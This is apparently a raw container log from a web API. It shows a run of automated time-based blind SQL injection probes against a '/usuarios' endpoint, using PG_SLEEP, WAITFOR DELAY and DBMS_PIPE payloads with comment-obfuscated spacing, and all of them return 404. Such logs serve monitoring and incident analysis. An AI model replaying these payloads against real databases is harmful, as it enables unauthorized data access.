api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:38896 - "GET /usuarios/%2A%2A/AND/%2A%2A/7575%3D%28SELECT/%2A%2A/7575/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38910 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/7575%3D%28SELECT/%2A%2A/7575/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%28%27ULPh%27%3D%27ULPh HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38908 - "GET /usuarios%27/%2A%2A/AND/%2A%2A/7575%3D%28SELECT/%2A%2A/7575/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29/%2A%2A/AND/%2A%2A/%27stEG%27%3D%27stEG HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38918 - "GET /usuarios/%2A%2A/AND/%2A%2A/7575%3D%28SELECT/%2A%2A/7575/%2A%2A/FROM/%2A%2A/PG_SLEEP%285%29%29--/%2A%2A/WdEU HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38932 - "GET /usuarios%29/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%288556%3D8556 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38940 - "GET /usuarios/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38954 - "GET /usuarios%27%29/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%28%27kqPe%27%3D%27kqPe HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38958 - "GET /usuarios%27/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27/%2A%2A/AND/%2A%2A/%27mIKY%27%3D%27mIKY HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38966 - "GET /usuarios/%2A%2A/WAITFOR/%2A%2A/DELAY/%2A%2A/%270%3A0%3A5%27--/%2A%2A/UbZz HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38976 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/3309%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28106%29%7C%7CCHR%2879%29%7C%7CCHR%2877%29%7C%7CCHR%28118%29%2C5%29/%2A%2A/AND/%2A%2A/%288814%3D8814 HTTP/1.1" 404 Not Found
